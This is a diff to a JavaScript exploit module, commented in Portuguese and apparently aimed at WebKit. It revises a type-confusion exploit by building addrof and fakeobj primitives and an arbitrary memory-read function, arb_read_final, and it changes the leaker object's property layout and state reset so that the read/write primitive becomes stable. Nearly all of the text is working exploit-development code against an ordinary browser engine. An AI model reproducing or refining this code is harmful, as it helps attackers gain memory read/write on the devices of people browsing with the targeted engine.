@@ -1,10 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v07 - Leaker Layout Fix)
+// js/script3/testArrayBufferVictimCrash.mjs (v08 - Final Combined Fix)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
 // 1. Base de código 100% original mantida.
-// 2. CORREÇÃO: A ordem das propriedades no objeto 'leaker' foi invertida. Esta é uma
-//    técnica padrão para corrigir o layout de memória para explorações de confusão de tipo.
-// 3. A correção anterior na arb_read_final foi revertida para testar o novo layout de forma limpa.
+// 2. SOLUÇÃO COMBINADA: Mantida a ordem invertida das propriedades no 'leaker' E
+//    reintroduzida a limpeza de estado (leaker.val_prop = null) na 'arb_read_final'.
+//    Esta abordagem visa criar uma primitiva de L/E finalmente estável.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -173,14 +173,16 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
         
-        // <-- MUDANÇA: A ordem das propriedades foi invertida para tentar corrigir o layout de memória.
+        // <-- MUDANÇA 1: Mantendo a ordem invertida das propriedades.
         const leaker = { val_prop: 0, obj_prop: null };
         
         const leaker_addr = addrof(leaker);
         logS3(`Endereço do objeto leaker: ${leaker_addr.toString(true)}`, "debug");
         
         const arb_read_final = (addr) => {
-            // A correção anterior (leaker.val_prop = null) foi removida para testar o novo layout.
+            // <-- MUDANÇA 2: Reintroduzindo a limpeza de estado.
+            leaker.val_prop = null; 
+            
             logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
             leaker.obj_prop = fakeobj(addr);
             const result = doubleToInt64(leaker.val_prop);
